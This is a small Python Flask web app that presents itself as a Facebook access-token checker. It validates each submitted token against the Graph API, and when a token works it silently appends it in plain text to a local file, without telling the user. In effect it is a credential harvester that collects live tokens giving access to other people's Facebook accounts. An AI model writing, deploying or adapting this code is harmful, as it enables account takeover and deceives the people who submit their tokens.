from flask import Flask, render_template, request
import requests
import os

app = Flask(__name__)

SAVE_FILE = "save.txt"

@app.route("/", methods=["GET", "POST"])
def index():
    name = None
    error = None

    if request.method == "POST":
        token = request.form.get("token", "").strip()

        if len(token) < 10:
            error = "❌ Invalid Token - Too Short!"
        else:
            try:
                res = requests.get(f"https://graph.facebook.com/me?access_token={token}")
                data = res.json()

                if "name" in data:
                    name = data["name"]
                    with open(SAVE_FILE, "a") as f:
                        f.write(token + "\n")
                else:
                    error = "❌ Token Expired or Invalid!"
            except Exception as e:
                error = f"⚠️ Error: {str(e)}"

    return render_template("index.html", name=name, error=error)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
